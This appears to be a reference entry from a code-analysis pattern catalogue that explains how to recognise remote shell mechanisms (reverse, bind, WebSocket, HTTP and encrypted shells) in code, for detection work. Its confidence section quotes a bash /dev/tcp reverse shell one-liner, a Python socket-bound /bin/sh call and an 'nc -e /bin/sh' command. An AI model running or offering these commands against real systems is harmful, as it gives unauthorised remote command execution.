# Remote Shell

## Description

A network connection is established and a shell process is spawned with its standard input/output/error streams redirected to the network connection. This creates an interactive command-line session accessible over the network: commands typed on one end are executed by the shell on the other, with output returned over the same connection.

## Constituent Atoms

| Atom | Role | Notes |
|---|---|---|
| `NETW.SOCKET` or `NETW.LISTEN` | Core | The network channel. SOCKET for outbound (reverse shell), LISTEN for inbound (bind shell). |
| `EXEC.SHELL` | Core | The shell process (`/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`) spawned to execute commands. |
| I/O redirection (stdin/stdout/stderr → socket) | Structural | The binding that connects the shell's I/O streams to the network connection. May use `dup2()`, subprocess pipes, or language-specific stream redirection. |
| `NETW.WS` or `NETW.HTTP` | Supporting | Alternative transports, WebSocket or HTTP-based shell tunneling instead of raw sockets |
| `XFRM.ENCODE` / `XFRM.ENCRYPT` | Supporting | Encoding/encryption of commands and output on the wire |

- **Core**: Must be present for this idiom to be recognized
- **Supporting**: Strengthens the match when present but not required
- **Structural**: A code structure rather than a specific atom

## Recognition Pattern

The characteristic shape is:

1. **Network channel established**: either an outbound connection to a remote host (reverse shell) or a listening port accepting an inbound connection (bind shell)
2. **Shell process spawned**: an OS shell is invoked (`/bin/sh`, `cmd.exe`, etc.)
3. **I/O streams bound to the network**: the shell's stdin reads from the socket, and its stdout/stderr write to the socket

The three components must be connected: the socket feeds the shell, and the shell feeds the socket. A shell process running independently alongside an unrelated network connection is not this idiom.

## Variations

- **Reverse shell**: The compromised system initiates an outbound connection (`NETW.SOCKET` → `connect()`) to an attacker-controlled address. The attacker's listener accepts the connection and gets shell access. This is the more common variant because outbound connections are less likely to be blocked by firewalls than inbound.
- **Bind shell**: The compromised system binds a port (`NETW.LISTEN`) and waits for the attacker to connect inbound. The attacker connects and gets shell access. More easily blocked by firewalls but doesn't require the attacker to have a reachable listener.
- **WebSocket shell**: Uses `NETW.WS` instead of raw sockets. The shell I/O is tunneled through WebSocket messages. Allows shell access through HTTP-aware firewalls and proxies.
- **HTTP shell**: Commands sent as HTTP requests, output returned as HTTP responses. Each command-response pair is a separate HTTP transaction. Slower but blends into HTTP traffic.
- **Encrypted shell**: The socket connection is wrapped in TLS/SSL or the command/output stream is encrypted with `XFRM.ENCRYPT`. Makes traffic inspection harder.

## What This Mechanism Is NOT

This idiom describes a mechanism, not a purpose:

- Through the MCD lens: Remote access backdoor, unauthorized command execution
- Through the architecture lens: Unusual I/O binding. Shell streams connected to a network socket is an atypical subprocess I/O pattern
- Through the capability lens: Full remote code execution capability. Anything the shell user can do, the remote operator can do
- Through the penetration testing lens: Standard remote access tool, a fundamental technique in authorized security testing

## Confidence Spectrum

**Strong match (high confidence):**
- Network socket, shell process, and I/O redirection are all present in connected code
- The shell is spawned with stdin/stdout explicitly set to the socket file descriptor
- The classic one-liner pattern is recognizable: `bash -i >& /dev/tcp/host/port 0>&1` or `subprocess.call(["/bin/sh"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())`

**Moderate match:**
- A shell process is spawned and a socket is open, but the I/O binding is indirect (piped through intermediate buffers, wrapped in a read/write loop)
- The shell is not invoked directly but through a command that spawns one (`system("nc -e /bin/sh ...")`)

**Weak match (low confidence):**
- A socket and a subprocess are present but the I/O binding is not traceable
- The code could be a legitimate remote administration tool or debugging interface

**Not this idiom:**
- A shell process is spawned but its I/O is not connected to any network channel
- A network socket exists but no shell or command execution is attached
- A web server that accepts HTTP requests and routes them to application handlers (that's a web application, not a remote shell)

## Notes

Remote shells are one of the most widely recognized mechanisms in software. The one-liner variants are catalogued extensively (`bash`, `python`, `perl`, `ruby`, `php`, `nc`, `socat`, PowerShell). The structural shape is consistent across all of them: network I/O ↔ shell I/O. Language-specific implementations vary in syntax but not in structure.
